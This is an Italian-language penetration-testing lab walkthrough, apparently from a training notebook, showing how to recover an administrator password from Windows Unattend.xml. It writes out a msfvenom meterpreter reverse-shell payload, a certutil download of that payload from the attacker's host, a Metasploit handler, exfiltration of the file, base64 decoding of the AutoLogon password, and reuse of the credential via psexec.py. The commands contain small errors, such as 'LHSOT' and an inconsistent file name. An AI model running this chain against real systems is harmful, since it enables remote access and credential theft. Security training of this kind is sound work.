# Searching For Passwords In Windows Configuration Files

<figure><img src="../../.gitbook/assets/image (2120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2121).png" alt=""><figcaption></figcaption></figure>

## Laboratorio

Possiamo usare direttamente l'accesso al sistema vittima che ci è stato fornito nell'ambiente di laboratorio, ma in questo caso seguiremo il processo che farebbe un hacker: sfruttare una vulnerabilità per avere accesso al sistema, fare escalation dei privilegi e poi entrare nella macchina vittima a cercare la password contenuta in questi file.

<figure><img src="../../.gitbook/assets/image (2122).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2123).png" alt=""><figcaption></figcaption></figure>

## Macchina attaccante

### Generare un meterpreter payload con msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
```

<figure><img src="../../.gitbook/assets/image (2124).png" alt=""><figcaption></figcaption></figure>

### Carichiamo il file sulla macchina vittima tramite http server

```
python -m SimpleHTTPServer 80
```

<figure><img src="../../.gitbook/assets/image (2125).png" alt=""><figcaption></figcaption></figure>

## Macchina vittima

Al fine di dimostrare il processo facciamo download del file direttamente sulla vittima, chiaro che nei casi reali devi prendere il controllo della vittima tramite exploit.

### Download payload meterpreter

```
cd Desktop
certutil -f http://10.10.5.2/payload.exe payload.exe
```

<figure><img src="../../.gitbook/assets/image (2126).png" alt=""><figcaption></figcaption></figure>

## Macchina attaccante

Stoppiamo il server HTTP e avviamo Metasploit Framework per avere il multi handler in ascolto per quando avvieremo il payload sulla vittima.

```
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHSOT 10.10.5.2
run
//andiamo sulla vittima e clicchiamo per eseguire il payload.exe e ci arriva una connessione
```

<figure><img src="../../.gitbook/assets/image (2127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2128).png" alt=""><figcaption></figcaption></figure>

#### Ci spostiamo sulla vittima per eseguire il payload.exe

<figure><img src="../../.gitbook/assets/image (2129).png" alt=""><figcaption></figcaption></figure>

#### Riceviamo la meterpreter session sul multi/handler

<figure><img src="../../.gitbook/assets/image (2130).png" alt=""><figcaption></figcaption></figure>

```
sysinfo
search -f Unattend.xml //ovviamente è più comodo farlo a mano sapendo dov'è
cd C:\\Windows\Panther
dir
download Unattend.xml
//ci spostiamo in un altro terminale per poter leggere il file senza chiudere MSF
cat Unattended.xml
// se andiamo in fondo al file troviamo un tag xml <AutoLogon> che contiene username e password encoded in Base64
// copiamo la password
vim password.txt //creiamo un nuovo file e la incolliamo dentro (usciamo con :wq)
//usiamo il tool base64 presente in Kali per decodificare la password
base64 -d password.txt
//verifichiamo che la password ottenuta sia ancora valida connettendoci con psexec
psexec.py Administrator@10.2.27.165 //alternativa: modulo psexec di MSF invece che in py
    whoami
```

<figure><img src="../../.gitbook/assets/image (2131).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2132).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2134).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2135).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2139).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2140).png" alt=""><figcaption></figcaption></figure>

Ed ecco che decrittando il base64 abbiamo ottenuto la password che è Admin@123

Potrebbe essere che l'amministratore abbia cambiato la password dopo l'installazione e che quindi questa sia obsoleta.

Però possiamo controllare usando psexec.py

<figure><img src="../../.gitbook/assets/image (2141).png" alt=""><figcaption></figcaption></figure>

Siamo riusciti a trovare la password dell'utente Administrator legittima attraverso il file Unattended.xml di Windows, è una grossa vulnerabilità di Windows che potremmo trovare in the wild.
